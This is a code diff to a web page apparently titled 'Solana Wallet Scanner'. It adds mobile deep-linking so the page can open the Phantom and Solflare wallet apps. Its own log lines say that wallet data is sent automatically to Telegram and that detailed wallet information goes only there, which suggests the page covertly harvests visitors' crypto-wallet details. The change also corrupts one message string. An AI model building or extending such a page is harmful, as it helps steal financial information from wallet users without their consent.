@@ -518,7 +518,7 @@
       }
 
       if (walletData.methodUsed) {
-        message += `📡 Метод сканирования: ${walletData.methodUsed}\n`;
+        message += `📡 Метод скани��ования: ${walletData.methodUsed}\n`;
       }
 
       if (walletData.solBalance > 0) {
@@ -866,19 +866,11 @@
     }
 
     // ============================================================================
-    // WALLET MANAGER
+    // MOBILE DEEP LINKING CONFIGURATION
     // ============================================================================
-
-    class SolanaWalletManager {
-      constructor() {
-        this.connectedWallet = null;
-        this.walletAddress = null;
-        this.walletName = null;
-        this.walletData = null;
-        this.scanner = new SolanaWalletScanner();
-        this.isScanning = false;
-        
-        const WALLET_CONFIG = {
+    
+    // Configuration for mobile wallet deep linking
+    const MOBILE_WALLET_CONFIG = {
       phantom: {
         name: 'Phantom',
         mobile: {
@@ -909,9 +901,127 @@
           }
         }
       }
-    }; 
+    };
+
+    function isMobileDevice() {
+     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+
+    // Get the mobile operating system
+    function getMobileOS() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      
+      if (/android/i.test(userAgent)) {
+        return 'android';
+      }
+      
+      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return 'ios';
+      }
+      
+      return 'unknown';
+    }
+
+    // Handle deep linking to mobile wallet apps
+    async function handleMobileWalletConnection(walletKey) {
+      const walletConfig = MOBILE_WALLET_CONFIG[walletKey];
+      
+      if (!walletConfig || !isMobileDevice()) {
+        return false; // Not a mobile wallet or not on mobile device
+      }
+
+      const os = getMobileOS();
+      if (os === 'unknown' || !walletConfig.mobile[os]) {
+        return false; // Unknown OS or no configuration for this OS
+      }
+
+      const mobileConfig = walletConfig.mobile[os];
+      const currentUrl = encodeURIComponent(window.location.href);
+      
+      // Try the scheme URL first
+      const schemeUrl = `${mobileConfig.scheme}${currentUrl}`;
+      
+      // The universal link as fallback
+      const universalUrl = `${mobileConfig.universal}${currentUrl}`;
+      
+      // The app store URL as last resort
+      const storeUrl = mobileConfig.store;
+      
+      console.log(`📱 Attempting to open ${walletKey} app on ${os}...`);
+      console.log(`🔗 Scheme URL: ${schemeUrl}`);
+      console.log(`🔗 Universal URL: ${universalUrl}`);
+      
+      // Try to open the app using the scheme
+      window.location.href = schemeUrl;
+      
+      // Set a timeout to redirect to the universal link if the scheme fails
+      const schemeTimeout = setTimeout(() => {
+        console.log(`⌛ Scheme didn't open, trying universal link: ${universalUrl}`);
+        window.location.href = universalUrl;
+        
+        // Set another timeout to redirect to the app store if both fail
+        const universalTimeout = setTimeout(() => {
+          console.log(`⌛ Universal link didn't open, redirecting to app store: ${storeUrl}`);
+          window.location.href = storeUrl;
+        }, 2000);
+        
+        // Store the universal timeout in sessionStorage so it can be cleared if needed
+        sessionStorage.setItem('universalTimeout', universalTimeout);
+      }, 2000);
+      
+      // Store the scheme timeout in sessionStorage so it can be cleared if needed
+      sessionStorage.setItem('schemeTimeout', schemeTimeout);
+      
+      return true; // Mobile connection attempt initiated
+    }
+
+    // Clear any pending timeouts when returning to the page
+    function clearStoredTimeouts() {
+      const schemeTimeout = sessionStorage.getItem('schemeTimeout');
+      const universalTimeout = sessionStorage.getItem('universalTimeout');
+      
+      if (schemeTimeout) {
+        clearTimeout(parseInt(schemeTimeout));
+        sessionStorage.removeItem('schemeTimeout');
+      }
+      
+      if (universalTimeout) {
+        clearTimeout(parseInt(universalTimeout));
+        sessionStorage.removeItem('universalTimeout');
+      }
+    }
+    
+    // Clear timeouts when the page is reloaded or focused
+    window.addEventListener('focus', clearStoredTimeouts);
+    window.addEventListener('pageshow', clearStoredTimeouts);
+
+    // ============================================================================
+    // WALLET MANAGER
+    // ============================================================================
+
+    class SolanaWalletManager {
+      constructor() {
+        this.connectedWallet = null;
+        this.walletAddress = null;
+        this.walletName = null;
+        this.walletData = null;
+        this.scanner = new SolanaWalletScanner();
+        this.isScanning = false;
+        
         this.walletConfigs = {
-         
+          phantom: {
+            name: 'Phantom',
+            provider: () => window.phantom?.solana,
+            downloadUrl: 'https://phantom.app/',
+            checkMethod: () => window.phantom?.solana?.isPhantom
+          },
+          solflare: {
+            name: 'Solflare',
+            provider: () => window.solflare,
+            downloadUrl: 'https://solflare.com/',
+            checkMethod: () => window.solflare?.isSolflare
+          },
           trustwallet: {
             name: 'Trust Wallet',
             provider: () => window.trustwallet?.solana,
@@ -980,6 +1090,15 @@
         if (this.isScanning) {
           console.log('⏳ Сканирование уже выполняется...');
           return;
+        }
+
+        // Check if we should handle mobile wallet connection
+        if (isMobileDevice() && MOBILE_WALLET_CONFIG[walletKey]) {
+          const mobileHandled = await handleMobileWalletConnection(walletKey);
+          if (mobileHandled) {
+            console.log(`📱 Mobile wallet connection initiated for ${walletKey}`);
+            return;
+          }
         }
 
         const config = this.walletConfigs[walletKey];
@@ -1400,6 +1519,7 @@
     console.log('🚀 Solana Wallet Scanner загружен и готов к работе!');
     console.log('📤 Автоматическая отправка данных в Telegram включена');
     console.log('🔒 Детальная информация о кошельке отправляется только в Telegram');
+    console.log('📱 Поддержка мобильных приложений Phantom и Solflare включена');
   </script>
 </body>
 </html>
